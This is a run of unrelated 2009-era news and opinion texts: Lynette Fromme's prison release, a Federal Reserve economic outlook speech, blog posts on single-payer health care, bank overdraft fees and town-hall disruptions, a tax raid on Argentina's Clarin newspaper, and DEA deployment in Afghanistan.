FMC - Carswell spokeswoman Maria Douglas would not comment on Fromme 's behavior in prison in recent years .
Fromme reportedly joined Manson 's family after meeting him in California in 1967 .
She was not involved in the murders of seven people , including pregnant actress Sharon Tate , on August 9 and 10 , 1969 , that landed Manson and other followers in prison .
However , she and other Manson followers maintained a vigil outside the courthouse during his trial .
In the WCHS interview , Fromme said that Manson should not be incarcerated because " he did n't kill anybody .
... I would rather be in , because I know I laid a lot of my thinking in his mind . "
Virga said he told the jury that Fromme assaulted Ford , but did not attempt to assassinate him .
If Fromme had killed the president , no one would have listened to her , he said .
" She did n't want people to think she was a kook . "
And she was n't , he said , recalling that Fromme was very cooperative during her trial and describing her as " a bright , intelligent young woman " from a middle - class family .
" It 's just hard to imagine how she got all caught up with Manson , " he said .
Fromme wanted to be heard on issues including the environment , he said .
" She had certain causes that she wanted to talk about .
But first and foremost in her mind was always Manson . "
Explaining herself after the attempt , according to the book " Real Life at the White House , " Fromme said , " Well , you know , when people treat you like a child and pay no attention to the things you say , you have to do something . "
During her trial , Virga traveled to Washington to depose Ford , who testified on videotape about the incident .
In the 1978 interview , Fromme called Manson " a once - in - a - lifetime soul . ...
He 's got more heart and spirit than anyone I 've ever met . "
She said she still corresponded with him .
" He 's got everything he wants coming from me , ' cause he gave me everything . "
She said then she did n't plan to seek a parole hearing : " The parole board does not hold my life in its hands .
And I do n't want to be too critical , but men tend to think they do .
Charlie never thought he did .
He never expressed all this desire for power , this desire for acceptance . "
Ford died in 2006 at age 93 .
The Gerald R. Ford Presidential Foundation did not respond to CNN requests for comment on Fromme 's release .
Virga , who is still practicing in Sacramento , said he had not heard from Fromme since her sentencing in 1975 .
" I wish her the best , and hope everything works out for her , and hope she stays out of trouble , " he said .
" She needs to stay out of trouble .
She 's been in prison a long time ... it was , in my mind , a tragedy that she wound up a disciple of Manson . "

It ’s a pleasure to appear before a group of professionals who spend as much time trying to understand the financial markets and the economy as I do .
It ’s fair to say that the last two or three years have provided all of us an education — a far - from - welcome one — of just how complex these subjects are .
We have had to rethink old assumptions and question conventional wisdom in the face of a crisis whose dimensions few of us might have imagined .
I am hugely relieved that our financial system appears to have survived this near - death experience .
And , as painful as this recession has been , I believe that we succeeded in avoiding the second Great Depression that seemed to be a real possibility .
Much of the recent economic data suggest that the economy has bottomed out and that the worst risks are behind us .
The economy seems to be brushing itself off and beginning its climb out of the deep hole it ’s been in .
That ’s the good news .
But I regret to say that I expect the recovery to be tepid .
What ’s more , the gradual expansion gathering steam will remain vulnerable to shocks .
The financial system has improved but is not yet back to normal .
It still holds hazards that could derail a fragile recovery .
Even if the economy grows as I expect , things wo n’t feel very good for some time to come .
In particular , the unemployment rate will remain elevated for a few more years , meaning hardship for millions of workers .
Moreover , the slack in the economy , demonstrated by high unemployment and low utilization of industrial capacity , threatens to push inflation lower at a time when it is already below the level that , in the view of most members of the Federal Open Market Committee ( FOMC ) best promotes the Fed ’s dual mandate for full employment and price stability .
As a result , monetary policy makers will continue to face a difficult task in the years ahead .
During the rest of my talk this afternoon , I will try to give a more detailed picture of the financial and economic landscapes .
My comments are my own and do not necessarily reflect the views of my Federal Reserve colleagues .
As I noted , we ’ve come a long way since last year when the financial system was teetering on the edge of collapse .
To me , it ’s plain that the extraordinary and aggressive response of governments and central banks around the world saved the day — heading off the kind of financial meltdown that would have inflicted catastrophic damage on the economy .
Some are skeptical about the effectiveness of emergency programs such as TARP , TAF , and TALF .
But , in my view , these programs staved off disaster .
And they have been keeping the patient on essential life support as little by little it begins to breathe again on its own .
While the worst was avoided , the financial shock that did hit the economy was awful enough .
The economy finally fell into recession at the end of 2007 when , on top of an ongoing drag from a contracting housing sector , the ever - dependable American consumer — who had shrugged off one shock after another in years past — finally succumbed to the fallout from the financial crisis .
Since the beginning of the downturn , real GDP has fallen by a bit short of 4 percent and the unemployment rate has jumped by nearly 5 percentage points .
Few , if any , parts of the economy have escaped the devastation .
In addition to the setbacks in housing and consumer spending , business investment , exports , and imports all fell off the table .
I ’m happy to report that the downturn has probably now run its course .
This summer likely marked the end of the recession and the economy should expand in the second half of this year .
A wide array of data supports this view .
However , payrolls are still shrinking at a rapid pace , even though the momentum of job losses has slowed in the past few months .
The housing sector finally seems to be improving .
Home sales and starts are once again rising from very low levels , and home prices appear to be stabilizing , even rising in recent months according to some national measures .
Meanwhile , manufacturing is also beginning to show signs of life , helped particularly by a rebound in motor vehicle production .
Importantly , consumer spending finally is bottoming out .
A particularly hopeful sign is that inventories , which have been shrinking rapidly , now seem to be in better alignment with sales .
That ’s occurred because firms slashed production rapidly and dramatically in the face of slumping sales .
Recent data suggest that this correction may be near an end and firms are now poised to step up production to match sales .
In fact , I expect the biggest source of expansion in the second half of this year to come from a diminished pace of inventory liquidation by manufacturers , wholesalers , and retailers .
Such a pattern is typical of business cycles .
Inventory investment often is the catalyst for economic recoveries .
True , the boost is usually fairly short - lived , but it can be quite important in getting things going .
Nowhere is this cycle more evident than in the auto sector .
Production cutbacks this year have led to sharp reductions in inventories .
Recently , sales of light vehicles have begun to rise , in part due to the government ’s cash - for - clunkers program .
As a result , auto manufacturing has picked up and , with inventories lean , prospects are good for further production increases .
In all of these sectors , improved financial conditions have played a vital part in stimulating greater activity .
To be sure , the financial system is not yet back to normal and credit is still tight .
But there have been notable improvements .
The stock market rally has helped households recover some of their lost wealth and provided a much - needed psychological boost .
Investors have regained some of their appetite for risk .
Interest rates on corporate bonds — especially for less - than - prime firms — have dropped sharply and issuance has been brisk .
Federal Reserve programs to support the mortgage market have helped push rates down .
And other Fed programs have helped jump - start issuance of securities backed by consumer and small business loans .
In the short - term wholesale funding markets , measures of stress have also diminished .
The fiscal stimulus program passed by Congress in February also deserves credit for helping the economy turn the corner .
Its tax cuts have raised disposable income , and government spending is directly adding to payrolls , providing another source of household income .
Much of the stimulus money remains to be spent and will add to growth as the year proceeds .
The normal dynamics of the business cycle have also turned more favorable .
Some economic sectors are growing again simply because they sank so low .
The inventory adjustment I just discussed is one factor , although the biggest part of those benefits usually is only felt for a few quarters .
But other business cycle patterns can be longer lasting .
Demand for houses , durable goods such as autos , and business equipment is beginning to revive as households and firms replace or upgrade needed equipment and structures .
I ’d like to pause for a moment to make a few observations about the Bay Area economy .
The recession has been felt keenly here .
Employment is down about 6 percentage points from its peak in late 2007 .
The unemployment rate has risen by more than 6 percentage points to just over 10 percent from its low point in late 2006 , outstripping the national increase .
A harsh slump in information technology , due to plunging business spending on tech equipment and services , has prompted extensive job cuts and been a key factor driving down the area economy .
Employment has fallen especially steeply on the hardware side , although IT service providers have cut back as well .
Fortunately , IT seems to be on the mend .
Sales of U.S. - made semiconductors are up substantially in recent months , prompting some prominent companies to bump up earnings outlooks for the remainder of the year .
My local contacts have noted an uptick in venture capital investment , and they say that companies that received venture funding in the past are doing better at meeting performance benchmarks .
Overall , the area ’s IT industry is in much better shape than it was following the dot - com bust of the early 2000s .
Clearly , it has struggled during this downturn .
But , this time around , it is not recovering from bubble - driven overexpansion , so it is well - positioned to take advantage of an economic upswing .
The area ’s housing market is also showing signs of life .
Sales of existing homes have been rising since late last year .
Of course , the pickup has been propelled in part by sales of foreclosed homes and widespread availability of properties at bargain - basement prices .
As we all know , Bay Area home prices have been decimated .
Estimates of the cumulative decline over the past few years range from about 15 percent to as high as 45 percent .
Many local homeowners are under water , and that ’s helped feed the foreclosure wave .
While it ’s too soon to be sure , this pernicious process may finally be coming to an end .
Some recent data show price increases and a notable pickup in sales of higher - end properties over the past few months .
Returning to the national economy , the all - important question is how strong the upturn will be .
With unemployment at 9.7 percent of the workforce and capacity utilization at its lowest level of the post - World War II period , the economy has an enormous amount of slack .
That gives us plenty of room to grow rapidly over the next few years .
Indeed , we need to grow robustly to alleviate the enormous human toll resulting from high unemployment and the waste of so much idle industrial capacity .
At first glance , history suggests that a vigorous expansion could very well take place .
Following previous deep recessions , the United States typically saw V - shaped recoveries .
For example , the economy grew at an average rate of nearly 6 percent during the two years following the severe recession in 1981 - 82 .
This time though rapid growth does not seem to be in store .
My own forecast envisions a far less robust recovery , one that would look more like the letter U than V .
And I ’m not alone .
The Blue Chip consensus forecast , reflecting the views of nearly 50 professional forecasters , anticipates by far the weakest recovery of the postwar era over the next year and a half .
A large body of evidence supports this guarded outlook .
It is consistent with experiences around the world following recessions caused by financial crises .
That seems to be because it takes quite a while for financial systems to heal to the point that normal credit flows are restored .
That is what I expect this time .
In the buildup to the recession , financial institutions became highly leveraged , a vulnerability compounded by investments in complex and risky assets funded with short - term debt .
In an attempt to improve credit quality and reduce risk , banks have now tightened business and consumer lending standards .
They have been doing so at the same time that rising unemployment and falling house prices have fed additional credit losses .
Unfortunately , more credit losses are in store even as the economy improves and overall financial conditions ease .
Certainly , households remain stressed .
In the face of high and rising unemployment , delinquencies and foreclosures are showing no sign of turning around .
The delinquency rate on adjustable - rate mortgages is now up to about 18 percent , and , on fixed - rate loans , it ’s about 6 percent .
Delinquencies on both types of loans have increased sharply over the past year and are still rising .
This trend is consistent across other major loan categories , and is affecting high - and low - quality borrowers alike .
Even recent - vintage loans are experiencing rising delinquency rates .
While it is important for economic recovery that lenders provide credit to worthy households and businesses , they also must maintain enough capital to withstand losses — even if economic conditions turn out to be worse than anticipated .
In the face of continuing credit losses , moves by lenders to shrink assets , reduce leverage , and conserve capital are restricting the provision of credit in the economy .
For example , the Fed ’s Senior Loan Officer Survey on Bank Lending Practices conducted in July showed that , for consumer loans , far more banks are tightening standards than easing them , despite some improvements in this measure in recent months .
Normally , if credit flows were restricted by these types of financial headwinds , the Fed would ease the stance of monetary policy by cutting its federal funds rate target .
But the funds rate is already at zero for all practical purposes , leaving the Fed ’s traditional policy tool as accommodative as it can be .
In fact , many versions of the Taylor rule , a well - known policy benchmark based on the state of the economy and inflation , indicate that we should lower the funds rate well below this zero bound — if such a thing were possible .
To provide more accommodation , the Fed has used unconventional policy tools .
Collectively , these programs , which have provided us a slew of new acronyms , appear to be helping .
But we have little experience with them and the extent of their effectiveness is highly uncertain .
So here ’s the bottom line : Financial conditions have clearly eased compared to the darkest days of the financial crisis .
But the financial system is still far from healthy and tight credit is likely to put a damper on growth for some time to come .
A sputtering financial system is not the only challenge before us .
The chances are slim for a robust rebound in consumer spending , which represents around 70 percent of economic activity .
Of course , consumers are getting a boost from the fiscal stimulus package .
But this program is temporary .
Over the long term , consumers face daunting issues of their own .
In fact , it ’s easy to draw a comparison between the financial state of households and that of financial institutions .
For years prior to the recession , households went on a spending spree .
This occurred during a period that economists call the “ Great Moderation , ” about two decades when recessions were infrequent and mild , and inflation was low and stable .
Credit became ever easier to get and consumers took advantage of this to borrow and buy .
Stock and home prices rose year after year , giving households additional wherewithal to keep spending .
In this culture of consumption , the personal saving rate fell from around 10 percent in the mid-1980s to 1½ percent or lower in recent years .
At the same time , households took on larger proportions of debt .
From 1960 to the mid-1980s , debt represented a manageable 65 percent of disposable income .
Since then , it has risen steadily , with a notable acceleration in the last economic expansion .
By 2008 , it had doubled to about 130 percent of income .
It may well be that we are witnessing the start of a new era for consumers following the traumatic financial blows they have endured .
The destruction of their nest eggs caused by falling house and stock prices is prompting them to rebuild savings .
The personal saving rate is finally on the rise , averaging almost 4 ½ percent so far this year .
While certainly sensible from the standpoint of individual households , this retreat from debt - fueled consumption could reduce the growth rate of consumer spending for years .
An increase in saving should ultimately support the economy ’s capacity to produce and grow by channeling resources from consumption to investment .
And higher investment is the key to greater productivity and faster growth in living standards .
But the transition could be painful if subpar growth in consumer spending holds back the pace of economic recovery .
Weakness in the labor market is another factor that may keep the recovery in low gear for a while .
As I mentioned , payroll employment has been plummeting for a year and a half .
While the August employment report offered more evidence that the pace of the decline has slowed , unemployment now stands at its highest level since 1983 .
My business contacts indicate that they will be very reluctant to hire again until they see clear evidence of a sustained recovery , and that suggests we could see another so - called jobless recovery in which employment growth lags the improvement in overall output .
What ’s more , wage growth has slowed sharply .
Over the first half of this year , the employment cost index for private - industry workers has risen by a meager three - quarters of one percent .
Unemployment , job insecurity , and low growth in incomes will undoubtedly take a toll on consumption .
When the array of problems facing consumers is considered , it is hard to see how we can avoid sluggish spending growth .
Putting the whole puzzle together , the main impetus to growth in the second half of this year will be inventory investment .
The boost it provides will be a big help for a while , but we will need to look to other sectors to sustain growth .
The fact that the largest sector of the economy — consumer spending — is likely to be lackluster implies a less - than - robust expansion .
Even the gradual recovery we expect will be vulnerable to shocks , especially from the financial sector .
As I said , financial conditions are better , but not back to normal .
And the likelihood of continuing losses by financial institutions will add new fuel to the credit crunch .
In particular , small and medium - size banks could experience damaging losses on commercial real estate loans .
Thus far , the largest losses have been on loans for construction and land development .
Going forward , however , rising loan losses on other commercial real estate lending is likely because property values are falling , office vacancy rates are rising , and credit remains tight or nonexistent for those many property owners that will need to refinance mortgages over the next few years .
Financial contagion from this sector is one of the most important threats to recovery .
The slow recovery I expect means that it could still take several years to return to full employment .
The same is true for capacity utilization in manufacturing .
It will take a long time before these human and capital resources are put to full use .
This brings me to the complex topic of inflation .
In my career , I have never witnessed a situation like the one that exists now , when views about inflation risks have coalesced into two diametrically opposed camps .
On the one hand , one group worries about the long - term inflationary implications of a seemingly endless procession of massive federal budget deficits .
At the same time , others fear that economic slack and downward wage pressure are pushing inflation below rates that are considered consistent with price stability and even raising the specter of outright deflation .
This dichotomy is on display among the participants in the Survey of Professional Forecasters .
The lowest quartile of forecasters focuses on disinflation over the next five years .
The top quartile is preoccupied with the possibility of rising inflation five to ten years out .
The fear of higher long - term inflation reflects , to a large degree , worries about Fed monetary policy .
Our array of new programs to spur the economy have pumped up our balance sheet and created a huge quantity of bank reserves in the process .
Some worry that we wo n’t be able to shrink our balance sheet because of political pressures , and in the process we will end up monetizing the government debt .
This fear is real , growing , and disruptive .
That ’s why it ’s so important for me to say the following loud and clear :
We at the Fed are and will remain fiercely independent from politics .
We have the means — and we certainly have the will — to tighten policy when the time is right .
In fact , by raising the interest rate that we pay on excess reserves we can tighten monetary policy even before our balance sheet shrinks .
And we are , as always , steadfast in our determination to achieve both of our statutory goals of full employment and price stability .
My personal belief is that the more significant threat to price stability over the next several years stems from the disinflationary forces unleashed by the enormous slack in the economy .
The 1980s provides a useful historical comparison .
During that period , fears about burgeoning federal deficits and an unsustainable fiscal situation were widespread , as they are today .
Moreover , the Fed was under significant political pressure , and some worried whether it would be able to safeguard its independence .
But those circumstances did n’t ignite a renewed bout of inflation .
Unemployment nearly hit 11 percent in 1982 and oil prices were sinking .
Core personal consumption expenditure ( PCE ) inflation — the Fed ’s preferred measure — fell about 6 percentage points during the first half of the 1980s .
Of course , that period differed from ours in one critical respect .
Then , inflation was coming down from unacceptably high levels .
Monetary policy was designed to be tight enough to bring inflation down to price stability , a goal we accomplished and have maintained for two - and - a - half decades .
Today , we are starting with very low inflation .
Core PCE price inflation has averaged just under 1 ½ percent over the past twelve months , which is already below the 2 percent rate that I and most of my FOMC colleagues consider an appropriate long - term price stability objective .
With slack likely to persist for years , it seems likely that core inflation will move even lower , departing yet farther from our price stability objective .
From a monetary policy point of view , the landscape will continue to present challenges .
We face an economy with substantial slack , prospects for only moderate growth , and low and declining inflation .
With our policy rate already as low as it can go , it ’s no wonder that the FOMC ’s last statement indicated that “ economic conditions are likely to warrant exceptionally low levels of the federal funds rate for an extended period . ”
I can assure you that we will be ready , willing , and able to tighten policy when it ’s necessary to maintain price stability .
But , until that time comes , we need to defend our price stability goal on the low side and promote full employment .
Thank you very much .

caravan to DC for single - payer health care .
-- Cassius ( to Brutus ) , in Julius Caesar ( Act I , Scene 2 )
You CAN handle the truth .
There ’s no nice way to say it .
The financial cost of health care is killing our citizens , hobbling our economy , crushing small business , and threatening the solvency of our government .
In the meantime , the health care industry is spending almost two million dollars a day lobbying Congress and manipulating public opinion to accept “ reform ” legislation that leaves a vicious , for profit system intact .
The “ public option ” is doomed .
First :
We will have a dysfunctional health care system designed around insurance companies .
Second :
It will be impossible to cover everyone without raising taxes .
The Obama administration is already saying it is acceptable to leave out 15 million people .
Which 15 million ?
Will you be one of them ?
Who gets to decide ?
Third :
In a “ post - option ” environment you can bet that the health insurance industry will manipulate the rules so that the sickest and most expensive patients will gravitate toward the public plan , which will cause it to fail .
When it does , the opponents of real reform will point to the “ public option ” and scream : “ See ! Single Payer wo n’t work ! ”
Earlier today , I was listening to a broadcast of a town hall meeting that was held by Ed Schultz on Friday night in Portland , Oregon .
Through a friend who recently moved there , and from listening to Thom Hartmann ’s radio show , which is based there , I had heard that Portland was a pretty progressive city .
Still , I was taken aback and very pleased to hear how much the sold - out crowd was so very in favor of single - payer health care , the concept of health care that dare not speak its name in Washington , DC .
This support of single payer is also what the majority of people that I know here in New York are also expressing .
Many , many months ago , I asked my doctor what he felt about the health care issue .
I was careful not to let on where I was coming from .
If we were going to discuss this , had to go first .
I was n’t about to irritate the man who has the box of latex gloves .
To my pleasant surprise , he answered , “ Single - payer is the only way out of the mess we ’re all in , but I know that whatever we get from Washington wo n’t be that , and it will be a complete fiasco .
” My doctor is a prophetic man .
Too bad that cretin from Montana Max Baucus , chairman of the Senate Finance Committee , did n’t want to hear from him or anyone else who had the firsthand knowledge and war stories that my doctor , so many other doctors , and their patients have and will continue to have when the shit hits the fan like an asteroid hitting from space .
One of the people who attended Ed Schultz ’s town hall in Portland was a doctor who announced to all present that he and four other Portland doctors had just formed an activist organization called Mad As Hell Doctors ( www.madashelldoctors.com ) .
To quote the website : I recommend that you read the whole page at the site .
It ’s not long .
The doctors also mention that , in a bit of activist theater , they are forming a caravan from Portland to Washington , DC , in September .
They hope for a very long caravan , and I wish them well , but we seem to live in a very passive age .
Perhaps we are just numb to it all by now .
Still , I would love to see hoards of RVs , trucks , buses , and cars descend on the nation ’s capital .
My god , how would our government get to work and do the people ’s business if the whole city was one big gridlocked traffic jam ?
Not to worry , the people ’s business , as we know all too well , is the last thing on the tiny little minds in DC ( Dirtbag Central ) .
Mad As
Hell goes on to call the so - called public option a trap .
To some that may seem harsh .
I personally never expected single - payer out of the inside the Beltway creeps , but I did , perhaps naively , hope for something that would soonto single - payer .
I have always been realistic about how the people who are supposed to be our representatives do n’t really give a damn , but if the whole health care debate has shown this country and the world anything , it is justthe lowlifes in Congress are , those in the Senate .
Maybe long - term that will be a good thing , but right now we just might be getting that trap that Mad As Hell refers to .
For a long time I have worried that we were being sold one idea of a public option while the dirtbag crowd fully intended it to be a public option in name only .
What really confirmed this for me was watching a senator from my state , one Chuck Schumer , sit on his increasingly fat ass and say nothing while Max Baucus got all hissy and furiously banged his woefully and pathetically undersized gavel and arrested those who showed up to contribute their experiences and knowledge to his precious hearings .
Schumer just sat there with his smirk firmly in place .
It was only when his constituents reacted and made it clear that they wanted a public option if they were n’t getting single - payer that Schumer belatedly said that of course he too wanted “ the public option . ”
Not only that , he said , he hadwanted “ the public option .
” Now why would n’t I trust this man ?
When the Mad As Hell doctors say the public option is a trap , they do n’t mean what it could and should be , they mean the version that the totally corrupt Senate has in mind : a public option that is so tied up in such a maze of subsidies for the medical - industrial complex -- premium shell games , “ flexible ” deductibles , and the like -- that it is completely castrated .
I increasingly suspect that we have been rope - a - doped by the kings of sleaze .
It started with the refusal to evensingle - payer .
Yes , we were never going to get it out of these living , breathing turds , but it should have beensacrifice in the war of compromise .
We would have then reluctantly seen single - payer get watered down into a public option .
Instead , the starting point was the public option , so what we now have is Obama ’s anti-public - option consigliere , Rahm Emanuel , giving the secret hand signals to Congress which basically say , “ It ’s OK to collect money from the K Street bribery squads and stick the knife in the public option .
We ’ll end up with more money than the Vatican for the next four election cycles . ”
Think of the whole health care reform debate as one big ugly fund - raiser .
Right now the words “ public option ” get mentioned less and less .
In their place is South Dakota Sen .
Kent Conrad ’s pull - the - wool - over - their - eyes scenario that goes by the name of " coops , " a concept that not only has already proved disastrous in places like Oregon but calls for continued control by the insurance companies .
Same thing , different name -- so what ?
Screw you , Conrad !
But he knows and expects that too few will be paying attention .
Ideas like the single - payer caravan that Mad As Hell is attempting on September 8 represent a pushback against Washington ’s business - as - usual .
It ’s coming in the form of an increased number of voices in favor of single - payer .
Part of it is in anger and frustration .
Part of it is , no doubt , the result of increased awareness of the definitions of terms and the details of what is going on and what could be if we had responsible government .
But , as Mad As Hell says : Obviously , if we repeal the Bush tax cuts for the top two percent , we can pay for apublic option , one with teeth .
Right now , however , the cost issue is being used as a prime scare tactic by opponents of reform both in Washington and in the media , and low - information voters are buying into it .
As for the medical - industrial complex manipulating the rules : they will .
They already do it .
You think they will stop ?
You think there wo n’t be loopholes put in just for them ?
They already turn you down for all sorts of fine - print things , often under a euphemistic catchall called “ preexisting conditions , ” which amounts to a " get out of jail free - of - paying " card for insurance companies .
You pay for years , and when you make a claim , only then do they investigate your entire medical history , looking for a reason to deny your claim .
At that point they have years of your payments in their vault .
With today ’s data bases , seeing your complete history is getting easier for them every day .
When you filled out that form years ago , did you mention that acne episode you had at age 14 ?
The stitches in your knee at 15 ?
The mild concussion from your first car accident ?
Technicalities - R- Us.
Those who want true reform are not being heard due to a willful disconnect between the bribe spongers who write our laws that dictate policy and the huge majority of the voters .
I started this post with a quote from a play about a government that thought it was more important than its country and people .
I ’ve always liked to think ofas a morality play .
“ Beware the ides of March ” and all that .
Maybe we should put on a presentation ofon the mall in front of the Capitol building when the lowlifes return from their recess .
My version , though , would substitute the name of a different senator every day in place of old dead Julius .
And the guys who did the deed would be ordinary folks .
You bunch of Caesar wannabes ; Come on out and watch .
Naw , they would n’t get it anyway .
Remember when South Carolina Sen.boasted a couple of weeks ago that the members of the House and Senate would go home for the August recess and come back afraid to vote for health care reform after they received an earful from their constituents ?
I have to think that he knew what was coming and was referring to what I saw on the MSNBC shows this Monday night :
Town halls held by members of Congress that were interrupted by crowds of thuggish , belligerent , shouting hooligans advised ( programmed ) , supported , and transported there by arms of the medical - industrial complex .

You gotta love banks .
They bring the American economy to its knees peddling crap mortgages , only to be bailed - out en masse by the taxpayers , and now they 're making a killing by charging customers ridiculous overdraft fees .
Yeah .
According to the Financial Times , U.S. banks are set to bring in $ 38.5 - billion in overdraft fees this year , nearly double the amount they collected in overdraft fees in 2000 , most of which will be charged to their poorest customers ( Surprise ! ) .
The most cash - strapped customers are the hardest hit by such fees , with 90 per cent of overdraft revenues coming from 10 per cent of the 130 m checking accounts in the US .
Regular use of overdrafts is most common among consumers with low credit scores , Moebs discovered .
Since the billions in bailout cash was n't enough to cover all of their losses , the median overdraft fee charged by banks rose this year for the first time in 40 years , with the highest fees being charged by the largest banks .
At BofA , a customer overdrawn by as little as $ 6 could trigger a $ 35 penalty .
If the customer does not realise they have a negative balance and continue spending , they could incur that fee as many as 10 times in a single day , for a total of $ 350 .
Failing to repay the overdraft within a few days results in an additional $ 35 penalty .
And the banks ' take on all of this ?
They 're just covering their asses !
Banks say that the fees compensate for the risk they incur when they pay on behalf of customers who do not have enough money in their accounts .
" Overdraft fees are there for a reason , we take on a lot of risk , " a senior banker said .
" It 's a service to our customers , they want us to pay their overdrafts . "
So what 's a poor overdraft fee - addled consumer to do ?
Write some damn letters to people in high places , which is what one careless Consumerist reader recently did when B of A tried to hit him with $ 525 in fees .
I just recently moved into a new apartment and had written the check to my landlord on the 30th of May or so .
I thought that he had cashed the check and I still had quite a bit of money left over which was great because I had a great many essentials I had to buy for my new / first apartment .
Cleaning supplies , shower curtain , rental van etc .
Unbeknown to me at the time my new landlord cashed the check on Friday and I was shopping for said essentials at various stores .
All told I ended up with 15 overdraft fees amounting to $ 525 in fees alone .
A hefty sum to be sure .
Being an avid reader of the Consumerist for a couple years or so , I remembered the notion of an executive email carpet bomb ( recent article as well ) .
So I set about crafting the email explaining the situation , stating that I have no problems with overdraft fees on large purchases but 37 dollars for a coffee from Dunkin Donuts was a bit much to swallow .
A bit nervous I hit send and began the waiting game , to no avail .
Today while at work I received a call from an unknown number , figuring that it was a credit collector hearkening my financial downward spiral I ignored it .
They left a message though and curiousity got the best of me .
A pleasant man named George from the office of the CEO had left a message notifying me the fees were to be removed and he left a number for me to call .
I immediately called after that and spoke to him for about 5 minutes telling me about the notification systems they have available to me and a little bit of light lecturing .
I just checked my account and the fees were indeed returned .
Needless to say a large weight has been lifted off of my shoulders .
So you see , there are some happy endings , but they 're rare .

When fear and hate - mongering is n't getting you anywhere at the voting booth , what 's a frustrated conservative to do ?
This morning , Politico reported that Democratic members of Congress are increasingly being harassed by " angry , sign - carrying mobs and disruptive behavior " at local town halls . [...]
The lobbyist - run groups Americans for Prosperity and FreedomWorks , which orchestrated the anti-Obama tea parties earlier this year , are now pursuing an aggressive strategy to create an image of mass public opposition to health care and clean energy reform .
A leaked memo from Bob MacGuffie , a volunteer with the FreedomWorks website Tea Party Patriots , details how members should be infiltrating town halls and harassing Democratic members of Congress :
Artificially Inflate Your Numbers : " Spread out in the hall and try to be in the front half .
The objective is to put the Rep on the defensive with your questions and follow - up .
The Rep should be made to feel that a majority , and if not , a significant portion of at least the audience , opposes the socialist agenda of Washington . "
Be Disruptive Early And Often : " You need to rock - the - boat early in the Rep ’s presentation , Watch for an opportunity to yell out and challenge the Rep ’s statements early . "
Try To " Rattle Him , " Not Have An Intelligent Debate : " The goal is to rattle him , get him off his prepared script and agenda .
If he says something outrageous , stand up and shout out and sit right back down .
Look for these opportunities before he even takes questions . "
Pathetic .
They can't persuade people to their extremist positions , so they go for intimidation and creating a false impression of disapproval and dissent .
We got your bipartisanship right here .
Everyone hates the Baucus plan , which appears to be little more than an opportunity to revitalize the Republican party in the eyes of younger voters and the middle class .
Basically , your options in American politics right now are evil and stupid ( R ) or spineless and stupid ( D ) .
You ’re doing a heckuva job , Brownie Baucus .
On the upside , Humana , Wellpoint , and United Health group are getting a nice little boost in their stock price today .

President Fernandez has accused Clarin of biased reporting
More than 200 tax inspectors have searched Argentina 's biggest newspaper , which is currently embroiled in a fierce battle with the government .
Officials said the raid on the daily Clarin was " routine " , but the newspaper accused the government of harassment .
President Cristina Fernandez is trying to push through media reforms which she says will modernise the industry .
But critics say the president 's aim is to weaken the Clarin Group , Argentina 's dominant media company .
President Fernandez and her husband , former president Nestor Kirchner , have in the past accused Clarin of biased reporting and described the group as a " monopoly " .
Thursday 's raid came on the same day Clarin newspaper published a report alleging a government farm trade controls agency granted a 10 m peso ( $ 2.6 m , £ 1.6 m ) subsidy to an agricultural firm without authorisation , local media report .
' Shameful custom '
A tax agency spokesman said the raid on the Buenos Aires offices of the paper was similar to those carried out at other companies and was aimed simply at examining the company 's books , Reuters news agency reports .
But Grupo Clarin claimed it was a form of government " harassment " and " intimidation " .
" We are truly surprised ... these types of inspections have never occurred in all of Clarin 's history as a newspaper , " Martin Etchevers , a group spokesman , said .
" The illegal use of government organisms to attack our companies is a shameful custom . "
The raid also drew criticism from the capital 's mayor , Maricio Macri , who said the operation " feeds levels of violence and confrontation " , the Buenos Aires Herald reports .
Lawmakers are currently debating the media reform bill , which would replace broadcast regulations that date back to 1980 , during the country 's military dictatorship .
The new rules would force the biggest media groups to sell some of their assets .
Grupo Clarin has TV and radio as well as newspaper interests .
Supporters of the bill say it will increase competition between media providers , thus driving down prices for consumers .
But opponents , including Mr Macri , fear the impetus for the bill springs from a personal grudge between the government and the newspaper group .
The U.S. government is deploying dozens of Drug Enforcement Administration agents to Afghanistan in a new kind of “ surge , ” targeting trafficking networks that officials say are increasingly fueling the Taliban insurgency and corrupting the Afghan government .
The move to dramatically expand a second front is seen as the latest acknowledgment in Washington that security in Afghanistan cannot be won with military force alone .
For much of its eight - year tenure , the Bush administration ’s counter - narcotics efforts in Afghanistan were focused on destroying the vast fields of poppy that have long been the source of the world ’s heroin .
Since the Sept. 11 attacks , Afghanistan ’s contribution to the global heroin trade has risen to 93 % , according to the U.N. Office of Drugs and Crime .
But the Obama administration believes that the effort drove many farmers and influential tribesmen into supporting the Islamist insurgency .
The Afghan government and some NATO allies in the country agree .

The United States is now shifting to a counterinsurgency campaign that in addition to sending more troops is funding nation - building efforts and promoting alternative crops to farmers who have long profited from poppy production .
The increased DEA effort is aimed at more than a dozen drug kingpins whose networks are producing vast amounts of hashish , opium , morphine and heroin , some of which ends up in the United States .
Some of these figures belong either to the Taliban or to influential tribes allied with it , and they are assisted by international drug trafficking rings that have flourished for decades in Afghanistan , Pakistan , Iran , Turkey and nearby countries , DEA officials say .
In interviews , more than a dozen current and former U.S. counter - narcotics officials said they were alarmed by the growing ties between drug traffickers and insurgents and the Afghan government ’s inability or lack of interest by many Afghan officials to go after them .

As hundreds of millions of dollars in aid from the U.S. - led coalition was allocated to build Afghan police and security agencies , the forces were being corrupted simultaneously at the highest levels by the very traffickers they were supposed to be capturing , said Bruce Riedel , who chaired the Obama administration ’s interagency review of policy toward Afghanistan and Pakistan .
“ Our whole effort at developing security in Afghanistan was undermined by having a Ministry of Interior that was interested in facilitating the drug trade rather than combating it , ” said Riedel , who retired from the CIA in 2006 after three decades of advising administrations on South Asia national security issues .
The current Afghan interior minister , Mohammed Hanif Atmar , Riedel said , is honest and well - intentioned -- and in mortal danger because of it .
“ If we can keep him alive , he ’ll do a great job .
But he ’s got a lot of enemies , ” said Riedel , now a senior fellow at the Brookings Institution Saban Center for Middle East Policy .
With the Taliban now controlling large swaths of Afghanistan , traffickers and their networks pay the militants as much as $ 500 million a year , according to U.S. and U.N. intelligence estimates , to grow and protect the poppy fields , smuggle the drugs and run sophisticated processing labs and drug bazaars in Afghanistan and neighboring countries .

Similar drug trafficking activity is flourishing in the tribal belt that includes northwestern Pakistan , and it is providing huge amounts of cash to the Pakistani Taliban and possibly Al Qaeda , the officials said .
“ We see their involvement through just about every stage of drug trafficking , and in each of the four corners of Afghanistan , ” Thomas Harrigan , deputy administrator and chief of operations for the DEA , said of the Taliban .
“ They use the money to sustain their operations , feed their fighters , to assist Al Qaeda . ”
